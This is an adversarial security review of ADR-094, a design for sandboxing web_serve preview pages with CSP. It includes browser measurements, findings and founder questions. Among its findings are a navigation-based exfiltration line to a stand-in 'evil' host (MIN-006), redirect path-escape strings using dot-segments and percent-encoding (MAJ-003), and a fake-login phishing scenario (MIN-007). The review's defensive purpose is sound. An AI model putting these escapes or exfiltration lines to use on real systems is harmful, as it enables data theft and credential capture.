# Adversarial Review: ADR-094 — One isolation model for every served preview surface (issue #798)

**Spec reviewed**: `docs/internal/architecture/ADR-094-preview-isolation-model.md` (commit 2158b4f37)
**Review date**: 2026-09-26
**Mode**: ADR mode (generic-markdown), one round
**Verdict**: **BLOCK**

## Executive Summary

The direction is right: a `sandbox` directive plus path-confined sources is the correct fix for #798 and matches the Library model. As written, though, the ADR would ship previews that no longer render. The opaque origin turns every CORS-mode request into a cross-origin one, and CORS headers (the server's permission for another origin to read a response) are only planned for webfonts. Both founder questions also rest on false premises: Q1's "move logins to the built-in browser" gets the same sandbox header, and Q2's degraded mode is mostly unreachable because web_serve already refuses to create a URL in that deployment shape.

| Severity | Count |
|----------|-------|
| CRITICAL | 1 |
| MAJOR | 8 |
| MINOR | 8 |
| OBSERVATION | 3 |
| **Total** | **20** |

Certainty labels used below: **Verified** = read in code or grep with a working instrument this session; **Inferred** = web-platform reasoning, not measured here; **Unknown** = needs a measurement.

**Browser measurement (reviewer, 2026-09-26).** CRIT-001 and the storage half of MAJ-001 were measured, not only reasoned. The fixture was a local page served with `Content-Security-Policy: sandbox allow-scripts; default-src 'none'; script-src http://127.0.0.1:<port>/p/ 'unsafe-inline'; connect-src http://127.0.0.1:<port>/p/`, which is ADR-094's model with confined sources. The page ran a `<script type="module" src="./mod.js">`, a `fetch('./data.json')` and a `localStorage` write. Headless Chromium and WebKit were driven by Playwright 1.61.1.

| Engine | Subresources without `Access-Control-Allow-Origin` | Subresources with `Access-Control-Allow-Origin: *` |
|---|---|---|
| Chromium | module script **blocked** ("from origin 'null' has been blocked by CORS policy"), fetch **failed**, `localStorage` **SecurityError** | module script ran, fetch ok, `localStorage` SecurityError |
| WebKit | module script **blocked** ("Origin null is not allowed by Access-Control-Allow-Origin"), fetch **failed**, `localStorage` **SecurityError** | module script ran, fetch ok, `localStorage` SecurityError |

Firefox was not measured.

---

## Findings

### CRITICAL Findings

#### [CRIT-001] Opaque origin breaks module scripts, `crossorigin` stylesheets and `fetch('./data.json')`. CORS is only planned for fonts

- **Lens**: Incorrectness / Infeasibility
- **Affected section**: §2.1 clause 3, clause 4, clause 10; §4 Positive 4; §6 Reachability bullet 1; §8 "Browser GREEN … the bundle still renders"
- **Description**: Clause 3 makes the document origin opaque. Every request that the browser sends in CORS mode then carries `Origin: null` and is cross-origin to the gateway. It needs `Access-Control-Allow-Origin` or the browser throws the response away. The ADR adds that header only for webfonts (clause 10, copied from the Library's `libraryPreviewNeedsCORS`, which covers `.woff2/.woff/.ttf/.otf` only). The Library could stop there because Library notes carry no module scripts and make no fetches. web_serve's core payload does:
  - `<script type="module" src=…>` is always fetched in CORS mode. Vite, React, Svelte and Astro production builds emit `<script type="module" crossorigin>` and `<link rel="stylesheet" crossorigin>` by default.
  - Dynamic `import()` is also CORS mode.
  - `fetch('./data.json')` is the exact reason clause 4 keeps a confined `connect-src`. From an opaque origin it is a cross-origin CORS request.
  
  The only CORS code today is `pkg/gateway/rest_preview.go::addPreviewCORSHeaders`. It reflects the header only when `Origin` equals the main origin, never for `null`.
  
  Also verified: `pkg/gateway/rest_workspace.go::workspaceContentType` has no `.mjs`, `.woff`, `.woff2` or `.wasm` entry, so those files go out as `application/octet-stream` with `nosniff`. That already blocks `.mjs` modules.
- **Evidence / certainty**: **Verified by measurement on Chromium and WebKit** (see "Browser measurement" above). A module script and `fetch('./data.json')` both fail without ACAO, and both succeed with `ACAO: *`. Verified — the webfont-only predicate (`pkg/gateway/rest_library_preview.go::libraryPreviewNeedsCORS`), the main-origin-only reflection (`addPreviewCORSHeaders`), and the MIME map. Verified — no `type="module"` fixture in the Library preview tests or in `tests/e2e/preview-bundle.spec.ts`, so the Library's "three engines loaded the bundle's script" measurement says nothing about module scripts. Inferred (high confidence) — the Fetch-standard rule that module scripts and `crossorigin` elements use CORS mode, and that an opaque origin serialises as `null`.
- **Impact**: An implementer follows the ADR, the unit tripwires go green, and a normal agent-built Vite/React static export renders blank on every engine. Positive 4 (`/data.json` still reachable) is false as written. The path of least resistance for the next developer "fixing blank previews" is to add `allow-same-origin`, which reopens #798 with nothing visible to show it.
- **Recommendation**: Replace clause 10 with a prefix-wide CORS clause:
  > "10. **CORS for the opaque origin.** Every successful response under `/preview/{agent}/{token}/`, static and proxied, carries `Access-Control-Allow-Origin: *` and never `Access-Control-Allow-Credentials`. On proxied responses this overrides any upstream ACAO/ACAC header, which `ModifyResponse` deletes first. Rationale: requests from the opaque origin carry no credentials, and the bytes are already gated by the path token."
  
  Add `.mjs → text/javascript`, `.woff2/.woff → font/*` and `.wasm → application/wasm` to `workspaceContentType`. State the residual: any origin that knows a preview URL can read that preview's bytes. Today only a navigation can.

---

### MAJOR Findings

#### [MAJ-001] Q1's fallback is false: the built-in browser and an "outside tab" get the same sandbox. Q1 also names the regression too narrowly

- **Lens**: Incorrectness
- **Affected section**: §4 Negative 1; §9 Q1 option (A); §2.3 "built-in browser panel … no CSP consumer"; §6 bullet 3 ("screencast path consumes no CSP")
- **Description**:
  1. The built-in browser panel runs a real server-side Chrome. That Chrome navigates to the same `/preview/…` URL (`pkg/tools/browser/manager.go`, which tells the agent to navigate to the URL web_serve returns) and enforces its CSP.
  2. There is no CSP bypass anywhere in the backend code. A grep for `BypassCSP`/`setBypassCSP` returns 0 hits; the same grep finds `chromedp` in `pkg/tools/browser`, so the search itself works.
  3. The screencast is only how the pixels reach the SPA. The page itself runs sandboxed.
  4. "A normal browser tab outside Omnipus" loads the same URL and gets the same header.
  
  So after this ADR, in-preview login works nowhere. Q1 also frames the loss as "login". The real loss is wider: `localStorage`, `sessionStorage`, IndexedDB and `document.cookie` throw a `SecurityError`. Common demo code touches storage at startup (theme persistence, Zustand `persist`, todo apps), so the whole app crashes, not only a login flow. Finally, cookie-based in-app sessions are already broken for dev-mode previews: `pkg/gateway/rest_preview.go::proxyDevRequest`'s Director strips the whole `Cookie` header ("TRADE-OFF (accepted)"). So FR-3 is already partly gone, and the ADR does not say so.
- **Evidence / certainty**: Verified (grep, code comments). Verified by measurement: `localStorage` throws `SecurityError` under the directive on Chromium and WebKit. Inferred (high): the CDP-driven built-in Chrome enforces the same header; that exact browser was not measured. Also Verified: ADR-044 records FR-3 as an operator **MUST**, tagged `[FACT]` ("The user MUST be able to log in to the previewed app (OAuth, session cookies, etc.)", `docs/internal/architecture/ADR-044-preview-on-main-listener.md`). Q1 therefore asks the founder to drop a stated operator requirement, not a nice-to-have, and should say so. Top-level OAuth redirects to an outside identity provider still navigate, but the returning app cannot persist the session.
- **Impact**: The founder answers Q1 believing a working fallback exists. It does not.
- **Recommendation**: Rewrite Negative 1 and Q1 as follows:
  - Storage APIs throw in every viewing context: the user's tab, the built-in browser, any browser.
  - Dev-mode cookie sessions are already stripped by FR-013.
  - The only remaining way to demo an app that needs logins or storage is Option A (a second origin), or serving it outside Omnipus.
  
  Correct §2.3 and §6: the built-in browser *does* apply the CSP, which is actually useful, because the agent sees what the user sees.

#### [MAJ-002] Q2's premise is false: web_serve already fails closed on a wildcard bind with no `public_url`

- **Lens**: Inconsistency (with code) / Incorrectness
- **Affected section**: §2.1 clause 9; §4 Negative 3; §7 row 3; §9 Q2
- **Description**: `pkg/tools/web_serve.go` (the `Execute` path) calls `middleware.CanonicalGatewayOrigin(cfg)`. If that returns `""`, it returns `previewOriginUnresolvedResult()` before registering anything. So no `/preview/` URL is ever created in the "wildcard bind, no `gateway.public_url`" shape. Q2 option (B), "fail closed — previews 404 in that deployment shape, removing the feature", is today's behaviour, not a new cost.
  
  The degraded `'self'` policy is still reachable, but through triggers clause 9 does not name. These are the other cases where `libraryIsolationOrigins` returns nil while `CanonicalGatewayOrigin` is non-empty:
  - a `public_url` with a wildcard host (`http://*.example.com`, which `pkg/config/validator.go` admits according to the Library header comment);
  - a non-loopback IPv6 `public_url` or host;
  - an unparseable value.
  
  In those shapes web_serve creates URLs and the builder degrades.
- **Evidence / certainty**: Verified (`pkg/tools/web_serve.go::previewOriginUnresolvedResult` and its call site; `pkg/gateway/library_isolation_policy.go::libraryIsolationOrigins`).
- **Impact**: The founder rules on a question that does not exist. Meanwhile the real degraded triggers go unlisted, so they are neither tested nor WARNed with the right cause.
- **Recommendation**: Drop Q2, or restate it around the real triggers. Rewrite clause 9 to list every degraded trigger exhaustively and give each a unit test. Consider failing closed (refuse to serve) for a wildcard-host `public_url`: that is operator misconfiguration, not a hosting constraint.

#### [MAJ-003] Clause 6 contradicts §2.2 and §8 on redirects, and the Location-rewrite rule is not specified precisely enough to implement safely

- **Lens**: Inconsistency / Insecurity
- **Affected section**: §2.1 clause 6 ("Nothing under `/preview/` ever answers 3xx or writes a `Location` header"); §2.2 bullet 2 ("rewrite root-relative upstream Locations under the preview prefix"); §8 GREEN ("upstream 302 followed only in-prefix")
- **Description**: Clause 6 forbids every 3xx and every `Location` header. §2.2 and §8 keep 3xx responses whose rewritten `Location` stays inside the prefix. The tripwire in clause 6 would fail on the behaviour §8 requires. Clause 6 also catches `304 Not Modified`, which Vite and other dev servers send routinely through the proxy.

  The rewrite rule covers only "root-relative" Locations. It misses:
  - absolute same-origin URLs (`http://127.0.0.1:5000/api/v1/x`; the Director does not rewrite `Host`, so dev servers can emit the gateway host);
  - protocol-relative (`//127.0.0.1:5000/api/…`) and backslash (`/\host`) forms;
  - dot-segment and percent-encoded escapes (`/preview/a/t/../../../api/v1/x`, `/preview/a/t/%2e%2e/…`). These pass a textual prefix check, but the browser normalises them outside the prefix. CSP3 §6.7.2.9 then ignores the path, and `connect-src` admits `/api/v1`.
- **Evidence / certainty**: Verified — `proxyDevRequest.ModifyResponse` today does not touch `Location`. Inferred (high) — WHATWG URL dot-segment normalisation, including `%2e%2e`.
- **Impact**: A string-prefix implementation of §2.2 passes the listed tests and still lets a prompt-injected dev server bounce a subresource or fetch to `/api/v1`, reopening #798 on WebKit (DEFECT 2 behaviour).
- **Recommendation**: Make one rule normative and amend clause 6 to match:
  > "`ModifyResponse`: when status ∈ {301,302,303,307,308}:
  > 1. Resolve `Location` against the request URL with WHATWG parsing (dot-segments and `%2e` normalised).
  > 2. If the result's origin is the gateway origin (any alias) and its path begins with `/preview/{agent}/{token}/`, emit it.
  > 3. Else, if the raw value was root-relative, re-root it under the token prefix and apply step 2 again.
  > 4. Otherwise replace the response with a 502 and no `Location`.
  >
  > A `Location` on any non-redirect status is deleted. A 304 is allowed."
  
  Update the tripwire: fail on any redirect status whose `Location` resolves outside the token prefix, and include the dot-segment, `%2e`, protocol-relative, backslash and absolute-same-origin cases.

#### [MAJ-004] The sandbox flag set is not specified

- **Lens**: Ambiguity / Insecurity
- **Affected section**: §2.1 clause 3, clause 5
- **Description**: Clause 3 says "sandbox directive, never allow-same-origin" but does not list the flags. The Library ships `sandbox allow-scripts` and nothing else (`libraryIsolationPolicyTemplate`). Copied as-is, that blocks:
  - form submission, which makes clause 5's rationale for a confined `form-action` pointless;
  - `target=_blank` and `window.open`;
  - `alert`/`confirm`;
  - downloads.
  
  Left open, an implementer will add flags until the demo works. `allow-popups-to-escape-sandbox` would give popups a real origin: a popup could navigate to itself under the prefix and read storage and cookies at the gateway origin.
- **Evidence / certainty**: Verified (Library template). Inferred (high) on flag semantics.
- **Recommendation**: Pin the literal flag list, for example `sandbox allow-scripts allow-forms allow-popups allow-modals allow-downloads`. Explicitly forbid `allow-same-origin`, `allow-popups-to-escape-sandbox`, `allow-top-navigation*` and `allow-storage-access-by-user-activation`, and assert each in the builder tripwire. State that `allow-popups` is safe for credentials because popups inherit the sandbox, and that popup egress is accepted for web_serve, unlike the Library's FR-006.

#### [MAJ-005] Clause 7's "never call, import or copy the Library builder" clashes with the Library's "no second origin computation" rule, and clause 2 would use `public_url` verbatim

- **Lens**: Ambiguity / Inconsistency
- **Affected section**: §2.1 clause 2, clause 7, clause 8
- **Description**: `pkg/gateway/library_isolation_policy.go::libraryIsolationOrigins` states: "There is deliberately no second origin computation anywhere in this package". It holds measured, load-bearing logic:
  - a concrete-host fail-closed check (blocks a wildcard `public_url`);
  - `public_url` normalisation to `scheme://host`;
  - the IPv6 expressibility check;
  - the loopback aliases.
  
  Clause 7 forbids calling or copying "the Library builder", and does not say whether those origin helpers count. If they count, web_serve re-implements about 150 lines of subtle logic, which is exactly the drift the clause says it wants to prevent. Clause 2 also says to use `CanonicalGatewayOrigin` directly, but that function returns `public_url` verbatim. With `https://host/` or `https://host/app` the sources become `https://host//preview/…` or `https://host/app/preview/…`, and every asset is blocked. On top of that, the serving paths today use a third computation, `pkg/gateway/rest_workspace.go::resolveMainOrigin` (TrimRight only), for `frame-ancestors` and CORS.
- **Evidence / certainty**: Verified (all three functions read).
- **Recommendation**: Split "origin list" from "policy string":
  - Share one neutral origin-list derivation (rename `libraryIsolationOrigins` to e.g. `previewIsolationOrigins`) across all three surfaces.
  - Keep clause 7's per-surface rule only for the policy template and its tripwire.
  - Retire `resolveMainOrigin` for preview responses, or list it in the blast radius.

#### [MAJ-006] Agents are not told the new constraints, so they will build apps that crash

- **Lens**: Incompleteness / Inoperability
- **Affected section**: §5 Blast radius (no `pkg/tools/web_serve.go` row); §6 Reachability
- **Description**: The agent builds the app and reviews it in the built-in browser, which now enforces the sandbox (MAJ-001). The web_serve `Description()` and the relevant skills say nothing about the new rules:
  - no storage APIs and no cookies;
  - assets must be relative, or under the token prefix (Vite `base: './'`);
  - forms and popups only within the pinned flags.
  
  The agent will see blank or crashed previews, with the reason visible only in the browser console.
- **Evidence / certainty**: Verified (`pkg/tools/web_serve.go::Description` text read).
- **Impact**: This fails the repo's Definition of Done: the feature is not reachable by the agent in a working form.
- **Recommendation**: Add a blast-radius row: `pkg/tools/web_serve.go::Description` plus any web-app skill text, owned by prometheus-prompt-engineer, stating the sandbox constraints. Add a §6 bullet: an agent following the tool text, with no human help, produces a preview that renders.

#### [MAJ-007] The test plan has no realistic-bundle fixture, so CRIT-001 and MAJ-004 would pass CI undetected

- **Lens**: Incompleteness (test coverage)
- **Affected section**: §8
- **Description**: "Browser GREEN … the bundle still renders" names no fixture. Unit tripwires check strings, not rendering. The CHECK mutations do not include "drop ACAO", "widen `connect-src` to the bare origin", "add `allow-popups-to-escape-sandbox`" or "string-prefix Location check". The RED case does not cover the dev-proxy path at all.
- **Recommendation**: Require a committed fixture: a real Vite production build (module script and `crossorigin` CSS), plus `fetch('./data.json')`, a guarded `localStorage` probe, a form POST inside the prefix, and a `target=_blank` link. Assert it renders on Chromium and WebKit, served both statically and through the dev proxy. Add the four mutations above to CHECK.

#### [MAJ-008] No normative policy string; "the six source directives" is undefined

- **Lens**: Ambiguity
- **Affected section**: §2.1 clause 2 ("every gateway source in the six source directives"); §5 row 1
- **Description**: The Library's six are script, style, img, font, media and frame, pinned byte-for-byte in ADR-067 §10.3 with a spec oracle. Today's web_serve CSP (`buildWorkspaceCSP`) has no `media-src` and no `frame-src`. The ADR does not say whether web_serve gains confined `media-src`/`frame-src`, keeps `worker-src 'none'`, or which six it means. The mail spec pins a literal (MC-10); this ADR gives prose only.
- **Recommendation**: Add the literal template to §2.1, with the placeholders `${PREVIEW_SOURCES}` and `${TOKEN_PREFIX}`, and make it the tripwire's oracle, as the Library does.

---

### MINOR Findings

#### [MIN-001] "Byte-stable, boot-frozen" (clause 8) vs a per-token, per-response build (§2.2)
- **Lens**: Ambiguity
- **Affected section**: §2.1 clauses 2 and 8; §2.2 bullet 1
- **Description**: A per-token policy cannot be byte-stable across responses. It is not stated what is frozen at boot (the origin list) and what is built per response (the path).
- **Recommendation**: "The origin list is frozen once at boot. The policy is byte-stable for a given `(agent, token)`."

#### [MIN-002] Agent ID and token go into the CSP header unescaped
- **Lens**: Insecurity
- **Affected section**: §2.2 bullet 1
- **Description**: `pkg/validation/entityid.go::EntityID` rejects only `/`, `\`, `..` and NUL. It allows `;`, `,`, spaces and quotes, any of which would split or corrupt directives if placed in a source path. Whether agent-creation code restricts IDs further is Unknown.
- **Recommendation**: Build sources from the registry's own values (`reg.AgentID`, the stored token), percent-encode them to the CSP path grammar, and add a tripwire case with a hostile agent ID.

#### [MIN-003] `frame-ancestors` "unchanged" vs Negative 4 "frame-ancestors tests must be updated"
- **Lens**: Inconsistency
- **Affected section**: §2.1 clause 5; §4 Negative 4
- **Description**: The two statements disagree. Also, "unchanged" silently keeps the `frame-ancestors *` fallback when `resolveMainOrigin` is empty.
- **Recommendation**: Say that only whole-string assertions change, and state whether the `*` fallback survives.

#### [MIN-004] Option letters collide with ADR-044's
- **Lens**: Inconsistency
- **Affected section**: §3
- **Description**: In "ADR-044 — Serve /preview/ on the main gateway listener", Option A is the *path approach* and Option B is the separate origin. ADR-094 calls the separate origin "Option A", and has no Option B. There are also two ADR-044 files in the directory (preview and video streaming).
- **Recommendation**: Relabel, or cross-reference ADR-044's letters.

#### [MIN-005] Option C's "session cookie `Path=/api/v1, /auth`" cannot be expressed
- **Lens**: Infeasibility
- **Affected section**: §3 Option C, last paragraph
- **Description**: A cookie has one `Path` attribute.
- **Recommendation**: Drop the idea or specify one path.

#### [MIN-006] §1.1 understates today's severity
- **Lens**: Incorrectness
- **Affected section**: §1.1 "What limits it today … direct exfiltration is blocked"
- **Description**: CSP does not cover top-level navigation. `location = 'https://evil/?' + apiData`, `window.open` and a clicked `<a>` all leave the page. Today a preview can read API data and send it out.
- **Recommendation**: Replace the sentence with: "The script can read API data and exfiltrate it via navigation; `connect-src` blocks only fetch-class egress."

#### [MIN-007] Spoofing residual not named: a fake Omnipus login at the real origin
- **Lens**: Insecurity (Spoofing)
- **Affected section**: §4 Negative
- **Description**: A preview can render a look-alike Omnipus login under the genuine Omnipus address. `form-action` confined to the prefix posts the typed password to the agent-controlled dev server, and navigation can send it out. The sandbox does not change this.
- **Recommendation**: Name it as an accepted residual, or note that only Option A removes it.

#### [MIN-008] Rollback and diagnosis not addressed
- **Lens**: Inoperability
- **Affected section**: whole ADR
- **Description**: There is no flag (fine for a one-way security fix). But nothing says how a user or operator learns why a preview is blank: CSP violations appear only in the browser console, and there is no report endpoint.
- **Recommendation**: State the rollback (a revert commit) and add a one-line troubleshooting note to the user docs for blank previews.

---

### Observations

#### [OBS-001] Loopback aliases may buy nothing for web_serve
- **Lens**: Overcomplexity
- **Affected section**: §2.1 clause 8
- **Suggestion**: Library previews use a *relative* iframe `src`, so the reader's spelling of the host matters. web_serve creates *absolute* URLs from the canonical origin (`pkg/tools/web_serve.go`, `fmt.Sprintf("/preview/%s/%s/", …)` appended to `origin`), so the preview opens at exactly that origin. The `localhost` alias then adds the Library's documented `[::1]`-squatter widening for no rendering gain. Inferred (medium): that the SPA uses the URL verbatim was not checked. Verify, then consider emitting the canonical origin only.

#### [OBS-002] Top-level navigation to SPA deep links is outside CSP's reach
- **Lens**: Insecurity
- **Affected section**: §4
- **Suggestion**: A sandboxed preview can still navigate its own tab to any SPA route. The SPA then runs with full credentials. Routes with search schemas exist (`src/routes/_app/settings.tsx`, `browser-live.tsx`, `library.tsx`). Whether any of them acts on a URL parameter at load is Unknown. State the invariant "no SPA route performs a state change from URL parameters on load" and have security-lead audit it.

#### [OBS-003] Inline PDF and dev-server HMR under the new policy are unmeasured
- **Lens**: Incompleteness
- **Affected section**: §7
- **Suggestion**: web_serve serves `.pdf` inline (`workspaceContentType`), while the Library serves PDFs as attachments. Whether Chromium's PDF viewer mounts inside a CSP-sandboxed document is Unknown; measure it. A host source with an `http` scheme does not match `ws://` (CSP3 scheme matching), so dev-server hot reload breaks under a confined `connect-src`. Inferred (medium). This is minor, given that root-absolute dev servers are already broken (Negative 2), but it should be listed.

---

## Structural Integrity (Variant C — generic markdown / ADR)

| Area | Assessment |
|---|---|
| **Scope clarity** | Good. It covers web_serve only, and explicitly excludes the SPA, the contracts and ADR-044's consolidation. |
| **Actors identified** | Partly. It names the user's tab, the SPA, and the dev-server upstream. It gets the built-in browser wrong (MAJ-001) and never considers the agent as the author of the served app (MAJ-006). |
| **Success criteria** | Weak. "The bundle still renders" has no fixture (MAJ-007). The acceptance for #798 itself is well stated. |
| **Failure modes** | Partial. The degraded mode is described but its triggers are wrong (MAJ-002). The redirect escape is recognised but under-specified (MAJ-003). Blank-render diagnosis is absent (MIN-008). |
| **Implementation detail** | Not enough to build safely: no literal policy (MAJ-008), no flag set (MAJ-004), an ambiguous helper-sharing rule (MAJ-005). |
| **Assumptions & constraints** | Several unstated or wrong: that CORS is needed only for fonts (CRIT-001), that the built-in browser is CSP-free (MAJ-001), that the degraded mode is reachable in the wildcard/no-`public_url` shape (MAJ-002). |

---

## Test Coverage Assessment

### Missing Test Categories

| Category | Gap | Affected |
|---|---|---|
| Realistic rendering | No Vite-built fixture with module script, `crossorigin` CSS, `fetch`, storage probe | CRIT-001, MAJ-004, MAJ-007 |
| Negative (redirect) | No dot-segment, `%2e`, protocol-relative, backslash or absolute-same-origin Location cases | MAJ-003 |
| Mutation | Missing: drop ACAO; widen `connect-src`; add an escape flag; string-prefix Location check | MAJ-007 |
| Dev-proxy path in RED | RED targets the static path only | MAJ-007 |
| Degraded triggers | No unit test per real trigger (wildcard-host `public_url`, IPv6, unparseable) | MAJ-002 |
| Injection | No hostile-agent-ID test for CSP construction | MIN-002 |

### Regression
The regression list in §8 is present and reasonable. It is missing the e2e specs that pin preview behaviour: `tests/e2e/web-serve-canonical.spec.ts` and `tests/e2e/web-serve-malformed.spec.ts`.

---

## STRIDE Threat Summary

| Component | S | T | R | I | D | E | Notes |
|---|---|---|---|---|---|---|---|
| Static preview response (CSP builder) | risk | ok | ok | risk | ok | ok | S: fake login at the real origin (MIN-007). I: `ACAO:*` needed for CRIT-001 widens readability to anyone holding the URL; state it. |
| Dev proxy (`proxyDevRequest`) | ok | risk | ok | ok | ok | risk | T/E: Location rewrite escapes via dot-segments or absolute URLs (MAJ-003) |
| Sandbox flags | ok | ok | ok | ok | ok | risk | E: `allow-popups-to-escape-sandbox` not forbidden (MAJ-004) |
| Origin derivation | ok | risk | ok | ok | ok | risk | A verbatim or wildcard `public_url` corrupts or relaxes sources (MAJ-005, MAJ-002) |
| Top-level navigation from a preview | ok | ok | ok | risk | ok | risk | SPA deep links and navigation egress are outside CSP (OBS-002, MIN-006) |

---

## Unasked Questions

1. What CORS header does every non-font response under the prefix carry, and is `ACAO:*` on agent-built content an accepted exposure? (CRIT-001)
2. Which exact `sandbox` flags ship, and which are forbidden by the tripwire? (MAJ-004)
3. Is the origin-list derivation shared with the Library or re-implemented? If shared, under what name? (MAJ-005)
4. Which configurations actually reach the degraded policy, given that web_serve refuses to create URLs when the canonical origin is empty? (MAJ-002)
5. Where, if anywhere, can a user demo an app that needs storage or login after this lands? (MAJ-001)
6. Does any SPA route change state from URL parameters on load? (OBS-002)
7. Do inline PDFs and dev-server hot reload still work under the sandbox? (OBS-003)

---

## Verdict Rationale

**BLOCK**, because of CRIT-001. Implemented as written, the ADR makes the web_serve preview close #798 by rendering nothing for the most common agent output, a module-script bundle. The obvious "fix" for that is `allow-same-origin`, which quietly undoes the security decision. MAJ-001 and MAJ-002 mean both founder questions must be re-posed before anyone answers them: Q1's fallback does not exist, and Q2's cost already exists. MAJ-003 to MAJ-005 and MAJ-008 are specification gaps that let an implementation pass its own tripwires and still leave an escape.

The core decision itself holds: sandbox plus path confinement on the one origin, no second origin, cookie scoping rejected. The corrections needed are to clauses 3, 4, 6, 7, 9 and 10, §9, and §8, not to the direction.

### Recommended Next Actions

- [ ] Replace clause 10 with prefix-wide `ACAO:*` and fix the MIME map (CRIT-001)
- [ ] Rewrite Negative 1, §2.3, §6 and Q1 so they no longer claim the built-in browser or an outside tab bypasses the sandbox (MAJ-001)
- [ ] Drop or restate Q2; list the real degraded triggers in clause 9 (MAJ-002)
- [ ] Make one normative redirect rule and align clause 6, §2.2 and §8 (MAJ-003)
- [ ] Pin the sandbox flag list and the forbidden flags (MAJ-004)
- [ ] Decide on sharing the origin-list helper; retire `resolveMainOrigin` for previews (MAJ-005)
- [ ] Add the web_serve tool-text row to the blast radius and an agent-reachability bullet to §6 (MAJ-006)
- [ ] Add the realistic-bundle fixture and the extra mutations to §8 (MAJ-007)
- [ ] Add the literal policy template (MAJ-008)
- [ ] Then team-lead interviews the founder on the questions below, and the architect makes the **one** correction round. Per the feature-flow rule this ADR gets exactly one grill: there is no re-grill, and any blocking finding still open after the correction goes to the founder.

---

## Questions for the founder

The ADR's own two questions are kept with their recommendations visible. The review restates both because their premises are wrong (MAJ-001, MAJ-002), then adds the decisions this review surfaced.

**ADR Q1 (as written)**: supersede ADR-044's FR-3, previewed-app login from inside the preview tab? Options: **(A) supersede FR-3, isolation outranks in-tab login, URL stays copyable (ADR recommends)**; (B) keep FR-3 and re-open ADR-044 for a second preview origin; (C) keep FR-3 and accept #798 as won't-fix.
**Review restatement Q1′**: FR-3 is an operator MUST. Under the sandbox, **no** viewer keeps it: not the user's tab, not the agent's built-in browser, not an outside tab. The loss is also wider than login: any app that uses `localStorage`, `sessionStorage`, IndexedDB or cookies throws at startup (measured). Dev-mode cookie sessions are already stripped today (FR-013). Options: **(A) drop FR-3; apps that need storage or login cannot be demoed inside Omnipus (review recommends; the security fix outranks it)**; (B) keep FR-3 via a second origin, a new decision superseding ADR-044; (C) accept #798.

**ADR Q2 (as written)**: accept the degraded-mode residual on wildcard-bind deployments with no `gateway.public_url`? Options: **(A) accept with one-shot boot WARN, Library-consistent (ADR recommends)**; (B) fail closed, previews 404 there; (C) accept and also document it in user docs.
**Review restatement Q2′**: that shape already fails closed. `web_serve` refuses to create a URL when the canonical origin is empty (`pkg/tools/web_serve.go::previewOriginUnresolvedResult`). The degraded policy is reached only through a wildcard-host `public_url`, a non-loopback IPv6 origin, or an unparseable origin. Options: **(A) fail closed for those triggers as well, since they are misconfigurations, not hosting limits (review recommends)**; (B) degrade with `connect-src 'none'` and the WARN, as the ADR proposes; (C) B plus user-facing docs.

**Q3 (CRIT-001)**: every file under a preview's token prefix must answer `Access-Control-Allow-Origin: *`, or module-script bundles render blank. The cost: anyone who holds a preview URL can read that preview's files from any website, where today only a click can open them. Options: **(A) accept, because the token in the URL is already the access key (recommended)**; (B) fonts only, as in the Library, accepting that most modern agent builds render blank.

**Q4 (MAJ-004)**: which sandbox permissions do previews get? Options: **(A) scripts, forms, popups, dialogs and downloads, with escape-to-real-origin, top-navigation and same-origin forbidden (recommended)**; (B) scripts only, as in the Library, so forms, new tabs and alerts do not work.

**Q5 (MIN-007)**: a preview can show a fake Omnipus login page at the real Omnipus address. Only a second origin removes this. Options: **(A) accept and write it down as a residual (recommended)**; (B) treat it as a reason to reconsider the second origin.
